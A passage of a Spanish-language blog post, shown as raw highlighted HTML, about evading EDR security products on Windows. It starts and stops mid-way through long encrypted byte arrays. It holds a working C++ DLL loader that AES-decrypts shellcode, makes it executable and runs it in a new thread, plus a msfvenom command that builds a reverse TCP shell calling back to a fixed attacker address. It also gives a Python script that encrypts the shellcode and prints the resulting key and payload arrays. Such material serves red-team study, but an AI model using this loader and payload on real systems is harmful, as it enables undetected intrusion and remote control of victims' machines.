class="mh">0xde</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x6</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0xd9</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x2c</span><span class="p">,</span> <span class="mh">0x6a</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0xaf</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0xdd</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0xf3</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="mh">0x5</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0x6d</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x7f</span><span class="p">,</span> <span class="mh">0xb2</span><span class="p">,</span> <span class="mh">0xc</span><span class="p">,</span> <span class="mh">0xe0</span><span class="p">,</span> <span class="mh">0xa2</span><span class="p">,</span> <span class="mh">0xce</span><span class="p">,</span> <span class="mh">0x3b</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0xf5</span><span class="p">,</span> <span class="mh">0xcf</span><span class="p">,</span> <span class="mh">0xa9</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x3a</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="mh">0xab</span><span class="p">,</span> <span class="mh">0x3</span><span class="p">,</span> <span class="mh">0xf3</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0xf2</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0xf4</span><span class="p">,</span> <span class="mh">0x4f</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x4a</span><span class="p">,</span> <span class="mh">0xaa</span><span class="p">,</span> <span class="mh">0x6a</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0xae</span><span class="p">,</span> <span class="mh">0xe0</span><span class="p">,</span> <span class="mh">0x13</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0xb7</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0xd8</span><span class="p">,</span> <span class="mh">0x9b</span><span class="p">,</span> <span class="mh">0xbc</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0xa6</span><span class="p">,</span> <span class="mh">0xb2</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0xdc</span><span class="p">,</span> <span class="mh">0x3b</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0xee</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0xf6</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0x76</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0xd3</span><span class="p">,</span> <span class="mh">0xa6</span><span class="p">,</span> <span class="mh">0xe0</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0xa0</span><span class="p">,</span> <span class="mh">0x7e</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0x6</span><span class="p">,</span> <span class="mh">0xf</span><span class="p">,</span> <span class="mh">0xae</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x92</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0x5a</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x1d</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0xba</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0xb1</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x9a</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0xfb</span><span class="p">,</span> <span class="mh">0x3e</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x9</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0x1d</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="mh">0xb0</span><span class="p">,</span> <span class="mh">0xf6</span><span class="p">,</span> <span class="mh">0x9c</span><span class="p">,</span> <span class="mh">0x94</span><span class="p">,</span> <span class="mh">0xd4</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0xfe</span><span class="p">,</span> <span class="mh">0xe</span><span class="p">,</span> <span class="mh">0xbb</span><span class="p">,</span> <span class="mh">0x98</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0xcf</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x3b</span><span class="p">,</span> <span class="mh">0x9d</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0xc2</span><span class="p">,</span> <span class="mh">0xc</span><span class="p">,</span> <span class="mh">0xa4</span><span class="p">,</span> <span class="mh">0xdf</span><span class="p">,</span> <span class="mh">0x7e</span><span class="p">,</span> <span class="mh">0x4</span><span class="p">,</span> <span class="mh">0xfd</span><span class="p">,</span> <span class="mh">0xf9</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0xc5</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0xc6</span><span class="p">,</span> <span class="mh">0xb5</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0xd</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0xa9</span><span class="p">,</span> <span class="mh">0xe</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0x9</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0xfb</span><span class="p">,</span> <span class="mh">0xa5</span><span class="p">,</span> <span class="mh">0xa3</span> <span class="p">};</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">key</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0xaf</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0xd4</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0xae</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0xa9</span><span class="p">,</span> <span class="mh">0x92</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0xbe</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x8a</span><span class="p">,</span> <span class="mh">0x9c</span><span class="p">,</span> <span class="mh">0x41</span> <span class="p">};</span>

<span class="k">extern</span> <span class="s">"C"</span> <span class="kr">__declspec</span><span class="p">(</span><span class="n">dllexport</span><span class="p">)</span> <span class="kt">void</span> <span class="nf">f0ns1</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">void</span> <span class="o">*</span> <span class="n">exec_mem</span><span class="p">;</span>
    <span class="n">BOOL</span> <span class="n">rv</span><span class="p">;</span>
    <span class="n">HANDLE</span> <span class="n">th</span><span class="p">;</span>
    <span class="n">DWORD</span> <span class="n">oldprotect</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">payload_len</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">);</span>
	<span class="n">exec_mem</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">);</span>
	<span class="n">AESDecrypt</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">payload</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">key</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">key</span><span class="p">));</span>
	<span class="n">RtlMoveMemory</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">);</span>
	<span class="n">rv</span> <span class="o">=</span> <span class="n">VirtualProtect</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READ</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oldprotect</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span> <span class="n">rv</span> <span class="o">!=</span> <span class="mi">0</span> <span class="p">)</span> <span class="p">{</span>
					<span class="n">th</span> <span class="o">=</span> <span class="n">CreateThread</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span> <span class="n">exec_mem</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
					<span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">th</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
	<span class="p">}</span>

<span class="p">}</span>
<span class="err">}</span>

<span class="n">BOOL</span> <span class="n">APIENTRY</span> <span class="nf">DllMain</span><span class="p">(</span><span class="n">HMODULE</span> <span class="n">hModule</span><span class="p">,</span>  <span class="n">DWORD</span>  <span class="n">ul_reason_for_call</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpReserved</span><span class="p">)</span> <span class="p">{</span>

    <span class="k">switch</span> <span class="p">(</span><span class="n">ul_reason_for_call</span><span class="p">)</span>  <span class="p">{</span>
    <span class="k">case</span> <span class="n">DLL_PROCESS_ATTACH</span><span class="p">:</span>
		<span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="n">DLL_THREAD_ATTACH</span><span class="p">:</span>
		<span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="n">DLL_THREAD_DETACH</span><span class="p">:</span>
		<span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="n">DLL_PROCESS_DETACH</span><span class="p">:</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
<span class="p">}</span>

</code></pre></div></div>

<p><img src="/assets/images/EDR_1_calc_injection.png" alt="EDR create Admin user" /></p>

<p>Simple pero efectivo en los 3 casos inyectas código y spwaneas una calculadora.</p>

<h2 id="inyección-de-un-shell-reversa">Inyección de un shell reversa</h2>

<p>Dado que tenemos la inyección de código probaremos a crear un payload malicioso que nos ejecute una shell reversa, mediante msfvenom de metaexploit framework:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom --platform Windows -p windows/shell/reverse_tcp LHOST=10.0.52.108 LPORT=8989  &gt; raw_reverse_shell_tcp.bin 
</code></pre></div></div>
<p>Encriptamos el payload con criptografía simétrica mediante AES, script en python:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">sys</span>
<span class="kn">from</span> <span class="n">base64</span> <span class="kn">import</span> <span class="n">b64encode</span>
<span class="kn">from</span> <span class="n">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
<span class="kn">from</span> <span class="n">Crypto.Util.Padding</span> <span class="kn">import</span> <span class="n">pad</span>
<span class="kn">from</span> <span class="n">Crypto.Random</span> <span class="kn">import</span> <span class="n">get_random_bytes</span>
<span class="kn">import</span> <span class="n">hashlib</span>

<span class="n">KEY</span> <span class="o">=</span> <span class="nf">get_random_bytes</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
<span class="n">iv</span> <span class="o">=</span> <span class="mi">16</span> <span class="o">*</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span>
<span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="n">hashlib</span><span class="p">.</span><span class="nf">sha256</span><span class="p">(</span><span class="n">KEY</span><span class="p">).</span><span class="nf">digest</span><span class="p">(),</span> <span class="n">AES</span><span class="p">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>

<span class="k">try</span><span class="p">:</span>
    <span class="n">plaintext</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="sh">"</span><span class="s">rb</span><span class="sh">"</span><span class="p">).</span><span class="nf">read</span><span class="p">()</span>
<span class="k">except</span><span class="p">:</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">File argument needed! %s &lt;raw payload file&gt;</span><span class="sh">"</span> <span class="o">%</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
    <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">()</span>

<span class="n">ciphertext</span> <span class="o">=</span> <span class="n">cipher</span><span class="p">.</span><span class="nf">encrypt</span><span class="p">(</span><span class="nf">pad</span><span class="p">(</span><span class="n">plaintext</span><span class="p">,</span> <span class="n">AES</span><span class="p">.</span><span class="n">block_size</span><span class="p">))</span>

<span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">AESkey[] = { 0x</span><span class="sh">'</span> <span class="o">+</span> <span class="sh">'</span><span class="s">, 0x</span><span class="sh">'</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="nf">hex</span><span class="p">(</span><span class="n">x</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">KEY</span><span class="p">)</span> <span class="o">+</span> <span class="sh">'</span><span class="s"> };</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">payload[] = { 0x</span><span class="sh">'</span> <span class="o">+</span> <span class="sh">'</span><span class="s">, 0x</span><span class="sh">'</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="nf">hex</span><span class="p">(</span><span class="n">x</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">ciphertext</span><span class="p">)</span> <span class="o">+</span> <span class="sh">'</span><span class="s"> };</span><span class="sh">'</span><span class="p">)</span>
</code></pre></div></div>
<p>Salida del proceso:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">python</span> <span class="p">..</span>\<span class="n">aes</span><span class="p">.</span><span class="n">py</span> <span class="n">raw_reverse_shell_tcp</span><span class="p">.</span><span class="nb">bin</span>
<span class="n">AESkey</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0xd</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0xb2</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0xe4</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0xcc</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x82</span><span class="p">,</span> <span class="mh">0x9f</span><span class="p">,</span> <span class="mh">0xcc</span><span class="p">,</span> <span class="mh">0xa4</span> <span class="p">};</span>
<span class="n">payload</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0xd3</span><span class="p">,</span> <span class="mh">0xac</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0x2d</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0xb2</span><span class="p">,</span> <span class="mh">0xf2</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="mh">0xfb</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0x26</span><span class="p">,</span> <span class="mh">0x1d</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0x96</span><span class="p">,</span> <span class="mh">0x3a</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0xa</span><span class="p">,</span> <span class="mh">0xd4</span><span class="p">,</span> <span class="mh">0xb6</span><span class="p">,</span> <span class="mh">0xcb</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0xa4</span><span class="p">,</span> <span class="mh">0xbc</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0xe7</span><span class="p">,</span> <span class="mh">0x7e</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0xf1</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xaa</span><span class="p">,</span> <span class="mh">0x99</span><span class="p">,</span> <span class="mh">0xcf</span><span class="p">,</span> <span class="mh">0xdc</span><span class="p">,</span> <span class="mh">0xfc</span><span class="p">,</span> <span class="mh">0xc7</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0xaa</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x4b</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0x5d</span><span class="p">,</span> <span class="mh">0xf3</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span> <span class="mh">0xea</span><span class="p">,</span> <span class="mh">0x9c</span><span class="p">,</span> <span class="mh">0xdb</span><span class="p">,</span> <span class="mh">0xa5</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0xaa</span><span class="p">,</span> <span class="mh">0xf0</span><span class="p">,</span> <span class="mh">0x94</span><span class="p">,</span> <span class="mh">0xfc</span><span class="p">,</span> <span class="mh">0xe0</span><span class="p">,</span> <span class="mh">0xfe</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x15</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0x7e</span><span class="p">,</span> <span class="mh">0xe4</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0xbd</span><span class="p">,</span> <span class="mh">0x8a</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x98</span><span class="p">,</span> <span class="mh">0xb9</span><span class="p">,</span> <span class="mh">0xcc</span><span class="p">,</span> <span class="mh">0xd7</span><span class="p">,</span> <span class="mh">0x19</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x2e</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x77</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0xdb</span><span class="p">,</span> <span class="mh">0x7</span><span class="p">,</span> <span class="mh">0x96</span><span class="p">,</span> <span class="mh">0x3e</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0xf0</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span> <span class="mh">0xda</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0xd8</span><span class="p">,</span> <span class="mh">0x1d</span><span class="p">,</span> <span class="mh">0xe4</span><span class="p">,</span> <span class="mh">0x9</span><span class="p">,</span> <span class="mh">0xb7</span><span class="p">,</span> <span class="mh">0xeb</span><span class="p">,</span> <span class="mh">0xce</span><span class="p">,</span> <span class="mh">0xa4</span><span class="p">,</span> <span class="mh">0xf6</span><span class="p">,</span> <span class="mh">0xb8</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0xe1</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="mh">0x4</span><span class="p">,</span> <span class="mh">0x94</span><span class="p">,</span> <span class="mh">0xbc</span><span class="p">,</span> <span class="mh">0xc5</span><span class="p">,</span> <span class="mh">0xb4</span><span class="p">,</span> <span class="mh">0x9d</span><span class="p">,</span> <span class="mh">0xdb</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x97</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0xa9</span><span class="p">,</span> <span class="mh">0xaa</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0xb8</span><span class="p">,</span> <span class="mh">0xec</span><span class="p">,</span> <span class="mh">0xce</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0xd5</span><span class="p">,</span> <span class="mh">0xc6</span><span class="p">,</span> <span class="mh">0xe</span><span class="p">,</span> <span class="mh">0xdd</span><span class="p">,</span> <span class="mh">0xf2</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0xa4</span><span class="p">,</span> <span class="mh">0xf2</span><span class="p">,</span> <span class="mh">0xe2</span><span class="p">,</span> <span class="mh">0xea</span><span class="p">,</span> <span class="mh">0xb0</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0xf</span><span class="p">,</span> <span class="mh">0xee</span><span class="p">,</span> <span class="mh">0xd1</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0x9f</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x7</span><span class="p">,</span> <span class="mh">0xd3</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0xe9</span><span class="p">,</span> <span class="mh">0x5</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0x98</span><span class="p">,</span> <span class="mh">0x5</span><span class="p">,</span> <span class="mh">0xb2</span><span class="p">,</span> <span class="mh">0x2a</span><span class="p">,</span> <span class="mh">0x98</span><span class="p">,</span> <span class="mh">0x5d</span><span class="p">,</span> <span class="mh">0x8c</span><span class="p">,</span> <span class="mh">0xfa</span><span class="p">,</span> <span class="mh">0xaf</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x9b</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0xe</span><span class="p">,</span> <span class="mh">0xad</span><span class="p">,</span> <span class="mh">0xde</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0xfb</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0x8f</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span> <span class="mh">0xa</span><span class="p">,</span> <span class="mh">0x6e</span><span class="p">,</span> <span class="mh">0x5a</span><span class="p">,</span> <span class="mh">0xfb</span><span class="p">,</span> <span class="mh">0x6b</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0xb6</span><span class="p">,</span> <span class="mh">0xd6</span><span class="p">,</span> <span class="mh">0xe5</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x9c</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0xc2</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="mh">0xda</span><span class="p">,</span> <span class="mh">0xbe</span><span class="p">,</span> <span class="mh">0x9b</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x7b</span><span class="p">,</span> <span class="mh">0x7f</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0x7f</span><span class="p">,</span> <span class="mh">0x9b</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x7e</span><span class="p">,</span> <span class="mh">0x4e</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0xfe</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x76</span><span class="p">,</span> <span class="mh">0xe1</span><span class="p">,</span> <span class="mh">0x94</span><span class="p">,</span> <span class="mh">0xf5</span><span class="p">,</span> <span class="mh">0x4b</span><span class="p">,</span> <span class="mh">0x26</span><span class="p">,</span> <span class="mh">0xe9</span><span class="p">,</span> <span class="mh">0xd</span><span class="p">,</span> <span class="mh">0xa</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0xcd</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0xd9</span><span class="p">,</span> <span class="mh">0xc9</span><span class="p">,</span> <span class="mh">0x19</span><span class="p">,</span> <span class="mh">0xeb</span><span class="p">,</span> <span class="mh">0xd5</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0xe9</span><span class="p">,</span> <span 